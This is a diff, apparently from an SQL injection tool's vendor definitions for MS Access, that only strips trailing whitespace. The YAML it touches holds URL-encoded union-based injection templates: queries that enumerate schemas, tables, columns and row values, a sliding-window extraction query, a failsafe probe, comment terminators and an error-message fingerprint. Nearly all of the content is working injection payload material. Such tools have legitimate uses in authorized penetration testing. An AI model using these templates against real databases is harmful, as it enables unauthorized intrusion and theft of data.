@@ -1,20 +1,20 @@
 vendor: Access
 
-resource: 
+resource:
  info: |
-  select 
+  select
       'version${enclose_value_sql}dbname${enclose_value_sql}user${trail_sql}'
       r
   from dual
-  
- schema: 
+
+ schema:
   database: |
-   select 
+   select
        rr
        %26'${trail_sql}'
        r
    from (
-       select 
+       select
            '${enclose_value_sql}'
            %26t.schema_name
            %26'${separator_qte_sql}0${enclose_value_sql}'
@@ -26,14 +26,14 @@ resource:
        group by t.schema_name
        ${limit}
    ) a
-   
+
   table: |
-   select 
+   select
        rr
        %26'${trail_sql}'
        r
    from (
-       select 
+       select
            '${enclose_value_sql}'
            %26t.table_name
            %26'${separator_qte_sql}0${enclose_value_sql}'
@@ -45,14 +45,14 @@ resource:
        group by t.table_name
        ${limit}
    ) a
-   
+
   column: |
-   select 
+   select
        rr
        %26'${trail_sql}'
        r
    from (
-       select 
+       select
            '${enclose_value_sql}'
            %26t.column_name
            %26'${separator_qte_sql}0${enclose_value_sql}'
@@ -64,15 +64,15 @@ resource:
        group by t.column_name
        ${limit}
    ) a
-   
-  row: 
+
+  row:
    query: |
-    select 
+    select
         rr
         %26'${trail_sql}'
         r
     from (
-        select 
+        select
             '${enclose_value_sql}'
             %26t.s
             %26'${separator_qte_sql}0${enclose_value_sql}'
@@ -84,31 +84,31 @@ resource:
         group by t.s
         ${limit}
     ) a
-   fields: 
+   fields:
     field: ${field.value}
     concat: "%26 '%7f' %26"
-    
-strategy: 
- configuration: 
+
+strategy:
+ configuration:
   slidingWindow: |
-   select 
-       '${lead}' 
+   select
+       '${lead}'
        %26substring(
-           r, 
+           r,
            ${window.char},
            65536
-       ) r 
+       ) r
    from (${injection})x
   limit: having count(*) between ${limit.value} and ${limit.value}
   failsafe: select '' %26 (1337${indice}7330%2b1) r from dual
   calibrator: string(65536, '${calibrator_sql}')
   limitBoundary: 1
   endingComment: --+-
-  fingerprint: 
-   errorMessage: 
+  fingerprint:
+   errorMessage:
     - MS Access
-    
- normal: 
+
+ normal:
   indices: union select ${result_range} from (${indice_unique})
   capacity: (select '${lead}${indice}' %26 ${calibrator} from dual)
   orderBy: order by 1337
